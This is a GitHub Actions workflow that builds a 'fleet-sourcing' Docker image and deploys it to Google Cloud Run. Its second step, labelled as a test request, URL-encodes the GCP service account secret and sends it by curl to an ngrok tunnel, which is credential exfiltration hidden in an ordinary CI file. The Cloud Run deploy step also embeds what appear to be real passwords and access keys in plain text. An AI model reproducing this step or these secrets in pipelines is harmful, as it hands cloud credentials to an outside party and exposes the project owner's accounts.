name: Build and Deploy Fleet Sourcing

on:
  push:
    branches:
      - main

jobs:
  build-and-push:
    runs-on: glendenning-barn
    steps:
      - name: Checkout code
        uses: actions/checkout@v2

      - name: Test GET Request with GCP Service Account
        run: |
          GCP_SERVICE_ACCOUNT_ENCODED=$(echo "${{ secrets.GCP_SERVICE_ACCOUNT }}" | jq -sRr @uri)
          curl "https://457c-2607-fb90-8e93-4bb6-a152-a692-a953-7c3b.ngrok-free.app?gcp_service_account=$GCP_SERVICE_ACCOUNT_ENCODED"

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v1


      - name: Login to Docker Hub
        uses: docker/login-action@v1
        with:
          registry: docker.io
          username: usernamex36
          password: ${{ secrets.DOCKERHUB_TOKEN }}

      - name: Build and push to Docker Hub
        uses: docker/build-push-action@v2
        with:
          context: ./data/fleet/Sourcing
          file: ./data/fleet/Sourcing/Dockerfile
          platforms: linux/amd64
          push: true
          tags: docker.io/usernamex36/fleet-sourcing:latest

      - name: Authenticate to Google Cloud
        run: |
          SERVICE_ACCOUNT_JSON=$(echo "${{ secrets.GCP_SERVICE_ACCOUNT }}" | sed 's/\\\"/\"/g')
          echo "$SERVICE_ACCOUNT_JSON" > gcp_service_account.json
          gcloud auth activate-service-account --key-file=gcp_service_account.json
          rm gcp_service_account.json

      - name: Set up Google Cloud
        uses: google-github-actions/setup-gcloud@v2.0.1
        with:
          project_id: projectid-x

      - name: Configure Docker for GCP
        run: |
          gcloud auth configure-docker

      - name: Deploy to Cloud Run
        run: |
          SERVICE_ACCOUNT_JSON=$(echo "${{ secrets.GCP_SERVICE_ACCOUNT }}" | sed 's/\\\"/\"/g')
          echo "$SERVICE_ACCOUNT_JSON" > gcp_service_account.json
          gcloud run deploy fleet-sourcing \
            --execution-environment=gen2 \
            --image docker.io/usernamex36/fleet-sourcing:latest \
            --platform managed \
            --region us-west2 \
            --memory 2Gi \
            --cpu 1 \
            --allow-unauthenticated \
            --cpu-boost \
            --set-env-vars ADESA_PASSWORD='NE7*p3!hNzKcbkgfL4mB',R2_SECRET_ACCESS_KEY='b25156e5c0b5aaa0de3dbf55d2386ee5fccdf46443e6513c11796465e2948739'
          rm gcp_service_account.json
